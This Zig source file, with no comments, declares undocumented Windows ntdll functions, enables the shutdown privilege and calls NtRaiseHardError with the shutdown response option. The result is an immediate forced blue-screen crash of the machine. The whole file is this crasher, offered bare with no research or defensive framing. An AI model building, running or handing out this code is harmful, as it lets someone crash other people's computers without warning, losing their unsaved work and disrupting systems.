const std = @import("std");

const NTSTATUS = i32;
const BOOLEAN = u8;
const ULONG = u32;

extern "ntdll" fn RtlAdjustPrivilege(Privilege: ULONG, Enable: BOOLEAN, CurrentThread: BOOLEAN, Enabled: *BOOLEAN) callconv(.C) NTSTATUS;
extern "ntdll" fn NtRaiseHardError(ErrorStatus: ULONG, NumberOfParameters: ULONG, UnicodeStringParameterMask: ULONG, Parameters: ?*anyopaque, ValidResponseOptions: ULONG, Response: *ULONG) callconv(.C) NTSTATUS;

pub fn main() void {
    var enabled: BOOLEAN = 0;
    var response: ULONG = 0;
    
    _ = RtlAdjustPrivilege(19, 1, 0, &enabled);
    _ = NtRaiseHardError(0xC0000420, 0, 0, null, 6, &response);
}

